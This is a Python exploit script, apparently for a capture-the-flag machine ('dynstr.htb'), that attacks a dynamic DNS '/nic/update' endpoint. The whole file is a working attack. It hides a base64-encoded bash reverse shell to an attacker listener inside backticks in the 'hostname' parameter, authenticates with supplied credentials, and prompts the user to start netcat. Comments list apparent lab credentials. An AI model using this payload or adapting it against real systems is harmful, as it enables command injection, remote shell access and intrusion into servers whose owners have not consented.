#!/usr/bin/python3
import requests
from requests.auth import HTTPBasicAuth
import base64
import sys

if len(sys.argv) > 6:
    lhost = sys.argv[1]
    lport = sys.argv[2]
    rhost = sys.argv[3]
    domain = sys.argv[4]

    user = sys.argv[5]
    passw = sys.argv[6]

    payload = "bash -c 'exec bash -i &>/dev/tcp/{}/{} <&1'".format(lhost, lport)
    pyenc = base64.b64encode(payload.encode())
    print("Injecting payload:",pyenc.decode())

    prms = {
        'hostname': '`echo "'+pyenc.decode()+'" | base64 -d | bash`'+rhost,
        'myip': lhost,
        'offline': 'YES'
    }
    input("Init netcat (nc -lvp "+lport+") and press enter. ")
    url = "http://"+domain+"/nic/update"
    req = requests.get(url, auth=HTTPBasicAuth(user,passw), params=prms)

    #'dynadns'
    #'sndanyd'

    print(req.text)
    print("code:",req.status_code)

else:
    print("More arguments needed!")
    print("Usage: lhost lport ldomain lhost user password")
    print("Example: 10.10.10.10 4444 test.no-ip.htb dynstr.htb dynadns sndanyd")

